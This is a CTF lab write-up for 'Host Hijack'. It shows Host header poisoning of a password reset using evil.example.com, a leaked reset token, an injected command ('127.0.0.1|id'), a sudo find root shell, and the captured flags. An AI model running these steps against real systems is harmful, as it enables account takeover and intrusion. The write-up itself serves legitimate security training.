---
layout: post
title: "Host Hijack"
description: "CTF writeup for MediTrack Health: exploiting a Host header vulnerability in the password reset flow to take over the admin account, leaking the full reset token from an exposed mail-log by shortening the Host header, then achieving root via a misconfigured NOPASSWD sudo find in a ping-tool command injection."
category: hackerdna
tags: [web, ctf, hackerdna, host-header-injection, password-reset, account-takeover, command-injection, privilege-escalation, sudo, gtfobins, cve]
---

## Host Hijack - CTF Writeup

**Category:** WEB | **Flags:** 2 (User / Root)

Challenge: [https://hackerdna.com/labs/host-hijack](https://hackerdna.com/labs/host-hijack)

## Contents

- [Reconnaissance](#reconnaissance)
- [Password Reset: Host Header Poisoning](#password-reset-host-header-poisoning)
- [Extracting the Full Reset Token](#extracting-the-full-reset-token)
- [Admin Account Takeover](#admin-account-takeover)
- [Command Injection in Server Diagnostics](#command-injection-in-server-diagnostics)
- [Privilege Escalation to Root](#privilege-escalation-to-root)

## Reconnaissance

MediTrack Health runs a staff portal: `/login`, `/forgot-password`,
`/dashboard`, and - leaked via `/robots.txt` - `/mail-log` and `/admin/`.

`/mail-log` is a JSON log of sent password-reset emails:

```json
[{"link":"http://3.252.132.32/reset-password?token=CF6dhOs4m_1YZk3kZ34W7U4RXvgtqXUe8u...",
  "subject":"Password Reset Request",
  "time":"...","to":"admin@meditrack.hdna.me"}]
```

## Password Reset: Host Header Poisoning

The reset email we saw was constructed from the **Host header** the request
was received from. By setting `Host` to an arbitrary value when POSTing to
`/forgot-password`, the link domain in the email changes:

```bash
curl -X POST http://TARGET/forgot-password \
  -H "Host: evil.example.com" -d "email=admin@meditrack.hdna.me"
```

```json
{"link":"http://evil.example.com/reset-password?token=RgbvmNp_qmYWZWl-h7e3Wo-YB437TS..."}
```

This is classic **host header injection**: reset links should be built from a
fixed base URL, never from the untrusted Host header. In the wild this lets an
attacker steal a victim's reset token.

## Extracting the Full Reset Token

The reset token is what matters, but `/mail-log` **truncates** each link to 78
characters:

| Host                 | Link length | Token chars |
|----------------------|-------------|-------------|
| `3.252.132.32`       | 78          | 34          |
| `evil.example.com`   | 78          | 30          |
| `a`                  | 73          | **43**      |

The shorter the Host, the more of the token is shown. Truncation only kicks in
when the link hits 78 chars, so a single-character host (`Host: a`) fits the
whole 43-character token:

```json
{"link":"http://a/reset-password?token=KS45264mMIrgjIQiTqu-YViz2Kckm9cEfyGEC1TBA04"}
```

## Admin Account Takeover

POSTing the new password to `/reset-password?token=<full-token>` resets
`admin`'s password. Logging in issues a session cookie - a signed JWT:

```text
session = eyJuYW1lIjoiRHIuIFNhcmFoIENoZW4iLCJyb2xlIjoiQWRtaW5pc3RyYXRvciIsInVzZXIiOiJhZG1pbkBtZWRpdHJhY2suaGRuYS5tZSJ9...
```

Decoded payload:

```json
{"name":"Dr. Sarah Chen","role":"Administrator","user":"admin@meditrack.hdna.me"}
```

The admin dashboard shows the **user flag**.
`bed21d2d-0586-47f0-90eb-a3efed2a2035`

## Command Injection in Server Diagnostics

`/admin/diagnostics` has a "Ping Test" form that runs system ping on the host
argument. It pipes the value into `ping` - command injection:

```bash
curl -X POST http://TARGET/admin/diagnostics \
  -b "session=..." -d "host=127.0.0.1|id"
```

```
uid=1000(meditrack) gid=0(root) groups=0(root),1(bin),...
```

Pipelining (`|`) injects arbitrary shell commands into the diagnostic tool.

## Privilege Escalation to Root

`sudo -l` shows one NOPASSWD binary:

```text
(root) NOPASSWD: /usr/bin/find
```

GTFOBins `sudo find` executes a shell as root via `-exec`. With a shell that
(as on Alpine) is `/bin/sh`:

```bash
sudo find . -exec /bin/sh -c 'cat /root/flag-root.txt' \;
```

Output (repeated per path visited):

```
67f42f66-9b87-4170-b651-5c89bc4ee26d
```

**Root flag:** `67f42f66-9b87-4170-b651-5c89bc4ee26d`

## How the Attack Works

1. **Host header poisoning** - the site uses the Host header to build the
   password-reset URL, so an attacker controls where the token goes.
2. **Obfuscated leak** - an unauthenticated `/mail-log` saves every reset
   email with the link; truncation in the log is bypassed by shortening the
   Host header.
3. **Account takeover** - full token + a POST = new admin password.
4. **Command injection** - the diagnostics ping feature shells out with user
   input.
5. **Sudo find** - `/usr/bin/find` with NOPASSWD root runs
   `-exec /bin/sh` as root (GTFOBins).

## Key Takeaways

- **Never build URLs from Host.** Use a configured base URL. Host injection in
  password-reset/verification links → instant account takeover.
- **Leaked secrets logs matter.** Even a truncating log can be exploited by
  manipulating adjacent parts of the data (here, the Host shrunk the URL).
- **`sudo find` = root.** Check `sudo -l` whenever you land an RCE endpoint;
  the OWASP/LPE classic `find -exec` covers both file access and shells.
- **GID 0 is not uid 0.** Even though `meditrack` had `gid=0(root)`, `/root`
  was still unreadable; NOPASSWD `find` is what actually crossed the boundary.